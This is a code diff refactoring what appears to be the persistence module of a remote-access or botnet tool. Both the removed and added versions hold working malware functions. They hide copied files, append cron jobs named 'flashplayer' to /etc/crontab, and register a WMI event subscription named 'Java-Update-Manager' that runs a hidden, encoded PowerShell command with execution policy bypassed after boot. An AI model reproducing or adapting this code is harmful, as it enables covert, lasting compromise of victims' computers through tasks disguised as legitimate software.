@@ -91,22 +91,20 @@ class Method():
         Attempt to establish persistence using the given method
 
         """
-        if sys.platform in self.platforms:
-            if not self.established:
-                self.established, self.result = globals()['_add_{}'.format(self.name)]()
-        else:
+        if sys.platform not in self.platforms:
             raise OSError("Persistence method '{}' not compatible with {} platforms".format(self.name, sys.platform))
+        if not self.established:
+            self.established, self.result = globals()['_add_{}'.format(self.name)]()
 
     def remove(self):
         """
         Remove an established persistence method from the host machine
 
         """
-        if sys.platform in self.platforms:
-            if self.established:
-                self.established, self.result = globals()['_remove_{}'.format(self.name)]()
-        else:
+        if sys.platform not in self.platforms:
             raise OSError("Persistence method '{}' not compatible with {} platforms".format(self.name, sys.platform))
+        if self.established:
+            self.established, self.result = globals()['_remove_{}'.format(self.name)]()
 
 def _add_hidden_file(value=None):
     try:
@@ -117,9 +115,9 @@ def _add_hidden_file(value=None):
                 hide = subprocess.call('attrib +h {}'.format(path), shell=True) == 0
             else:
                 dirname, basename = os.path.split(value)
-                path = os.path.join(dirname, '.' + basename)
+                path = os.path.join(dirname, f'.{basename}')
                 hide = subprocess.call('cp {} {}'.format(value, path), shell=True) == 0
-            return (True if hide else False, path)
+            return hide, path
         else:
             util.log("File '{}' not found".format(value))
     except Exception as e:
@@ -139,9 +137,7 @@ def _add_crontab_job(value=None, minutes=10, name='flashplayer'):
                     if task not in data:
                         with open('/etc/crontab', 'a') as fd:
                             fd.write('\n{}\n'.format(task))
-                    return (True, path)
-                else:
-                    return (True, path)
+                return (True, path)
     except Exception as e:
         util.log("{} error: {}".format(_add_crontab_job.__name__, str(e)))
     return (False, None)
@@ -226,16 +222,19 @@ def _add_registry_key(value=None, name='Java-Update-Manager'):
 def _add_powershell_wmi(command=None, name='Java-Update-Manager'):
     try:
         global template_wmi
-        if os.name == 'nt' and not _methods['powershell_wmi'].established:
-            if command:
-                cmd_line = r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(base64.b64encode(bytes(command).encode('UTF-16LE')))
-                startup = "'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
-                script = template_wmi.substitute(STARTUP=startup, COMMAND_LINE=cmd_line, NAME=name)
-                _ = util.powershell(script)
-                code = "Get-WmiObject __eventFilter -namespace root\\subscription -filter \"name='%s'\"" % name
-                result = util.powershell(code)
-                if name in result:
-                    return (True, result)
+        if (
+            os.name == 'nt'
+            and not _methods['powershell_wmi'].established
+            and command
+        ):
+            cmd_line = r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(base64.b64encode(bytes(command).encode('UTF-16LE')))
+            startup = "'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
+            script = template_wmi.substitute(STARTUP=startup, COMMAND_LINE=cmd_line, NAME=name)
+            _ = util.powershell(script)
+            code = "Get-WmiObject __eventFilter -namespace root\\subscription -filter \"name='%s'\"" % name
+            result = util.powershell(code)
+            if name in result:
+                return (True, result)
     except Exception as e:
         util.log('{} error: {}'.format(_add_powershell_wmi.__name__, str(e)))
     return (False, None)
